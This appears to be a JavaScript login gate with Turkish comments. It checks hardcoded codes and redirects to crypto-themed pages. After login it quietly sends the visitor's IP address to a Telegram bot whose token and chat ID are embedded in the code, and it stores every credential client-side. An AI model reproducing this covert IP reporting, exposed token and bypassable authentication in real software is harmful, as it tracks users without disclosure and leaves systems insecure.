document.addEventListener("DOMContentLoaded", () => {
  const credentials = [
    { login: "8393", key: "73868", redirect: "indexbtc.html" },
    { login: "07590", key: "99567", redirect: "indexeth.html" },
    { login: "07591", key: "00257", redirect: "indexsol.html" },
    { login: "07592", key: "92092", redirect: "indextrx.html" },
    { login: "07593", key: "93022", redirect: "indexbnb.html" },
    { login: "07594", key: "94027", redirect: "indexpl.html" },
    { login: "07595", key: "95290", redirect: "indexdoge.html" },
    { login: "07596", key: "95290", redirect: "index9.html" },
    { login: "23236", key: "90890", redirect: "indexusdt.html" },
  ];

  const loginInput = document.getElementById("key1");
  const keyInput = document.getElementById("key2");
  const form = document.getElementById("login-form");

  // Daha önce giriş yapılmışsa, ilgili dosyaya yönlendir
  const previousLogin = localStorage.getItem("authorized");
  if (previousLogin) {
    const redirectPage = credentials.find(
      (cred) => cred.login === previousLogin
    )?.redirect;
    if (redirectPage) {
      window.location.href = redirectPage;
      return;
    }
  }

  form.addEventListener("submit", (event) => {
    event.preventDefault();

    const loginValue = loginInput.value.trim();
    const keyValue = keyInput.value.trim();

    const matchedCredential = credentials.find(
      (cred) => cred.login === loginValue && cred.key === keyValue
    );

    if (matchedCredential) {
      alert("✅🔓✅");
      localStorage.setItem("authorized", matchedCredential.login); // Giriş bilgisi kaydet
      window.location.href = matchedCredential.redirect; // İlgili dosyaya yönlendir

      // IP adresini al
      fetch("https://api.ipify.org?format=json")
        .then((response) => response.json())
        .then((data) => {
          const userIP = data.ip;
          sendIPToTelegram(userIP); // IP'yi Telegram botuna gönder
        })
        .catch((error) => console.error("IP alırken hata:", error));
    } else {
      alert("❌🔒❌");
    }
  });

  // Telegram bot API'sine IP adresini gönder
  function sendIPToTelegram(ip) {
    const botToken = "8005519970:AAHTEs2M8Uu2ozW_4V0SkyBxAfbggCV7mTo"; // Bot token'ınızı buraya girin
    const chatID = "5021980342"; // Chat ID'nizi buraya girin
    const message = `Yeni giriş yapıldı! Kullanıcının IP adresi: ${ip}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatID,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log("IP başarıyla gönderildi.");
        } else {
          console.error("Telegram'a gönderme hatası:", data);
        }
      })
      .catch((error) => console.error("Telegram API hatası:", error));
  }
});
